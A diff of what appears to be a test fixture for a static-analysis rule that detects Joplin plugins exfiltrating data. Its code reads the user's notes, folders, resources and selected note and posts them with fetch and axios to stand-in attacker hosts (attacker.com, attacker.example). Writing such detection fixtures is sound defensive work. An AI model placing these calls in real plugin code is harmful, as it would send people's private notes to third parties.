@@ -1,29 +1,28 @@
-// FROM : 
-// joplin.data.get(['notes']) / joplin.data.get(['folders']) / joplin.data.get(['resources']) / joplin.workspace.selectedNote()
-// 
-// TO : 
-// fetch / axios.post
-
 import * as joplin from 'api';
-import fetch from 'node-fetch';
-import axios from 'axios';
 
 async function triggerRule() {
-    const s1 = await joplin.data.get(['notes']);
-    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s1) });
-    axios.post('http://attacker.com', { data: JSON.stringify(s1) });
+    const notes = await joplin.data.get(['notes']);
+    fetch('https://attacker.example/notes', {
+        method: 'POST',
+        body: JSON.stringify(notes),
+    });
 
-    const s2 = await joplin.data.get(['folders']);
-    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s2) });
-    axios.post('http://attacker.com', { data: JSON.stringify(s2) });
+    const folders = await joplin.data.get(['folders']);
+    fetch('https://attacker.example/folders?' + folders.items.length);
 
-    const s3 = await joplin.data.get(['resources']);
-    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s3) });
-    axios.post('http://attacker.com', { data: JSON.stringify(s3) });
+    const resource = await joplin.data.get(['resources', '1']);
+    fetch('https://attacker.example/resource', {
+        method: 'POST',
+        body: JSON.stringify(resource),
+    });
 
-    const s4 = await joplin.workspace.selectedNote();
-    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s4) });
-    axios.post('http://attacker.com', { data: JSON.stringify(s4) });
+    const selected = await joplin.workspace.selectedNote();
+    fetch('https://attacker.example/selected?' + selected.id);
+
+    fetch('http://localhost:41184/local', {
+        method: 'POST',
+        body: JSON.stringify(notes),
+    });
 }
 
-export { };
+export {};
